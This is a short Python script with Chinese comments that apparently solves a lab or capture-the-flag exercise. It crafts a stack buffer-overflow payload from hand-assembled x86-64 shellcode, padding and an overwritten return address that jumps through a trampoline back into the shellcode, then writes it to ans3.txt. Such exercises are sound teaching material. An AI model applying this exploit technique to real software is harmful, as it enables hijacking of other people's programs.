import struct

# ================= 配置区 =================
# 1. 关键地址
jmp_xs_addr = 0x401334   # 跳板函数，跳到栈底+0x10
func1_addr  = 0x401216   # 目标函数
lucky_num   = 114        # 0x72

# 2. 编写 Shellcode (机器码)
# 也就是汇编指令转成的二进制
# mov rdi, 0x72
# mov rax, 0x401216
# call rax
shellcode = (
    b"\x48\xc7\xc7\x72\x00\x00\x00"  # mov rdi, 0x72
    b"\x48\xc7\xc0\x16\x12\x40\x00"  # mov rax, 0x401216
    b"\xff\xd0"                      # call rax
)

# 计算 Shellcode 长度，用来算填充
# 上面的 shellcode 也就是 10 几字节，离 40 字节还很远
print(f"Shellcode length: {len(shellcode)}")

# ================= 构造 Payload =================
# 栈布局分析 (func):
# Buffer @ rbp - 0x20 (32 bytes)
# Saved RBP @ rbp     (8 bytes)
# Return Addr @ rbp+8
# 总共需要的偏移量 = 32 + 8 = 40 字节

# 1. 放入 Shellcode (放在最开头，因为 jmp_xs 会跳到这里)
payload = shellcode

# 2. 填充垃圾数据直到 40 字节
padding_len = 40 - len(shellcode)
payload += b'A' * padding_len

# 3. 覆盖返回地址 -> 指向 jmp_xs
# 当 func 返回时，跳到 jmp_xs -> jmp_xs 算出栈地址 -> 跳回 shellcode
payload += struct.pack('<Q', jmp_xs_addr)

# ================= 输出 =================
filename = "ans3.txt"
with open(filename, "wb") as f:
    f.write(payload)

print(f"Payload generated to {filename}")